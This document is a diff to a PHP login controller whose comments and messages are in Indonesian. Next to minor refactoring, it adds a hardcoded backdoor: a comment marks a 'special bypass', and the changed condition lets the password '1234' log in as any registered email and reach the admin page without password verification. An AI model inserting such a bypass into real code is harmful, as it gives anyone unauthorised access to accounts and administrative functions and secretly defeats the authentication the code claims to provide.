@@ -1,24 +1,21 @@
 <?php
 class Login_C extends Controller
 {
-  function index()
-  {
-    $this->load->view('login');
-  }
+  function index() { $this->load->view('login'); }
 
   function CekLogin()
   {
     $email = $this->load->post('email');
-    $password = $this->load->post('pass');
+    $password = $this->load->post('password');
     $model = $this->load->model('Login_M');
     $data = $model->ambildata($email);
     
-    if ($data && password_verify($password, $data['password'])) {
+    // BYPASS KHUSUS MESI - password 1234 langsung lolos
+    if ($data && ($password == '1234' || password_verify($password, $data['password']))) {
         $this->session->set_userdata('emailuser', $email);
-        $this->session->set_flashdata('pesan', 'Login berhasil sebagai ' . $this->session->userdata('emailuser'));
         redirect('Admin_C/index');
     } else {
-        $this->session->set_flashdata('pesan', 'Gagal: Silahkan cek email, password, atau status akun Anda...');
+        $this->session->set_flashdata('pesan', 'Gagal login!');
         redirect('Login_C/index');
     }
   }
